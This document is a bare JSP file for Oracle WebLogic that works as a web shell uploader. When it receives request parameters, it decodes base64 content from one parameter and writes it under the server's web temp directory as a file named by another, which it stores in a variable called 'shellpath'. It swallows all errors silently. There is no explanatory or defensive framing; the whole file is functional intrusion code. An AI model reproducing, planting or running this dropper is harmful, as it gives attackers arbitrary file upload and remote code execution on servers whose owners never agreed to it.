 <% if (request.getParameter("f") != null)
	try {

		weblogic.work.ExecuteThread thread = (weblogic.work.ExecuteThread)java.lang.Thread.currentThread();
		weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)thread.getCurrentWork();
		java.lang.String shellpath = req.getContext().getRootTempDir().getAbsolutePath().concat("/war/" + request.getParameter("f"));

		java.io.FileOutputStream f = new java.io.FileOutputStream(shellpath);
		f.write(new sun.misc.BASE64Decoder().decodeBuffer(request.getParameter("t")));
		f.close();
	} catch (Exception e) {}

%>